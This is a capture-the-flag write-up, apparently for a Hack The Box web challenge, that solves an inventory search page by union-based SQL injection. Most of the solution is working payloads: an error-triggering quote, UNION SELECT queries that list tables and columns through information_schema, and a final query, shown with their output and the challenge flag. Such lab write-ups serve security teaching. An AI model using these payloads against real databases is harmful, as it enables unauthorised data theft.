# Unholy Union

## Description

On the outskirts of a forsaken town lies an abandoned warehouse, rumored to store more than just forgotten relics. Locals speak of an unholy union within its database, where spectral data intertwines with the realm of the living. Whispers tell of a cursed ledger that merges forbidden entries through mysterious queries. Some say that the warehouse's inventory system responds to those who know how to merge the right requests. Can you brave the haunted inventory system and unravel the ghostly union of data before the spirits corrupt the world beyond?

## Solution

Challenge provides Search functionality along with debug information about our actions:

![Unholy Union.png](/assets/ctf/htb/unholy-union.png)

The seems to be no filtration/sanitization to prevent SQLi

![Unholy Union-1.png](/assets/ctf/htb/unholy-union-1.png)

Cause an error to leak information about database:
```sql
xxx'
```

```bash
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1
```

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-union-based](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-union-based)

Get tables in current database:
```sql
xxx' UNION SELECT 1,2,3,4,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database() -- -
```

```js
[
  {
    "id": 1,
    "name": "2",
    "description": "3",
    "origin": "4",
    "created_at": "flag,inventory"
  }
]
```

Get fields of `flag` table
```sql
xxx' UNION SELECT 1,2,3,4,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='flag' -- -
```

```js
"created_at": "flag"
```

Get flag:
```sql
xxx' UNION SELECT 1,2,3,4,flag FROM flag -- -
```

```js
"created_at": "HTB{uN10n_1nj3ct10n_4r3_345y_t0_l34rn_r1gh17?_bae03870d038c3fc0bf034b09ffcc7d2}"
```

::: tip Flag
`HTB{uN10n_1nj3ct10n_4r3_345y_t0_l34rn_r1gh17?_bae03870d038c3fc0bf034b09ffcc7d2}`
:::

